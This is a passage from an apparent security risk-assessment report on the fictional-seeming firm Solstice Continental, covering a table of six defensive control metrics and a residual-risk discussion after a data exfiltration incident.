To verify that implemented controls remain permanently effective, Solstice Continental adopts six automated, reproducible evaluation metrics (Table 8). Aligned with established security metric principles [1], each metric is consistently collected, inexpensive to aggregate from existing logs, expressed numerically as an unambiguous percentage or integer, meaningful to executive risk owners, and context-specific to customer data protection on `db01`.

#### Table 8. Control Evaluation Metrics Framework (Automated Telemetry)
| ID | Metric Name & Target Risk | Measurement Formula and Data Sources | Frequency | Success Target | Diagnostic Business Question |
| :-: | :--- | :--- | :---: | :---: | :--- |
| **M1** | **Remote MFA Enrolment Coverage [R1]** | % of interactive remote sessions entering via MFA gateway (Gateway Log / `auth.log`) | Daily | 100% effective from Week 4 | *Is external access fully protected by strong authentication?* |
| **M2** | **Brute-Force Throttling Effectiveness [R1]** | % of simulated bursts of 20 rapid login failures locked out by the 5th attempt; count of servers exposing SSH to Internet | Monthly; quarterly | 100% blocked by 5th try; 0 open public servers | *Would the 12 March brute-force assault be stopped?* |
| **M3** | **Standing Supplier Root Elimination [R2]** | Count of third-party supplier accounts retaining standing root or sudo rights (`/etc/sudoers` vs approved JIT grants) | Weekly | 0 standing grants from Week 2 | *Does any contractor retain standing root privileges?* |
| **M4** | **Privileged Elevation Governance [R2]** | % of privilege elevations bound to an approved ticket, sponsor, and $\le 8$h grant | Monthly | 100% compliant from Week 6 | *Is every administrative elevation formally auditable and authorized?* |
| **M5** | **Central Log Ingestion & Integrity [R6]** | % of production servers streaming logs to WORM SIEM daily; count of administrator accounts capable of altering central logs | Daily; quarterly | 100% servers; 0 unauthorized modifications | *Are audit records complete, centralized, and immutable?* |
| **M6** | **Mean Time to Triage & Containment [R6]** | % of replayed attack chain techniques generating real-time alerts; median minutes elapsed from alert to containment | Quarterly | 100% alerted; $\le 60$ min triage; $\le 24$h contain | *Will an intrusion be detected and contained within ICO statutory boundaries?* |

---

### 4. Residual Risk and Evidentiary Boundaries
While full execution of the implementation plan fundamentally shrinks the attack surface, residual risk inevitably persists:
* **Residual R1 (Target Score: $L2 \times I4 = 8$, Low):** While public-facing SSH is decommissioned, adversaries may attempt session hijacking, SIM swapping, or MFA fatigue attacks against remote workers. Threat hunting and conditional-access anomalies partially mitigate this residual vector.
* **Residual R2 (Target Score: $L2 \times I5 = 10$, Medium):** Although standing privileges are removed, a compromised contractor account could execute malicious actions within an approved JIT maintenance window before the 8-hour expiry elapses. Mandatory session recording and command-line monitoring mitigate this window.
* **Residual R6 (Target Score: $L2 \times I4 = 8$, Low):** Real-time SIEM alerting remains vulnerable to alert fatigue in the SOC or ultra-slow "living-off-the-land" egress techniques utilizing legitimate business channels. Semi-annual red-team replays and purple-team tuning maintain alert fidelity.
* **Irreversible Data Exposure:** The 50,136,893,440 bytes (~46.69 GiB) of customer orders and database backups successfully exfiltrated across the 51 nights cannot be recalled from external server `203.0.113.92`. Solstice Continental faces unavoidable regulatory scrutiny and civil notification liabilities under the Data Protection Act 2018.

All seven organizational risks will be formally re-rated at Day 90 post-implementation to confirm that residual scores remain within Board-approved risk tolerance limits.
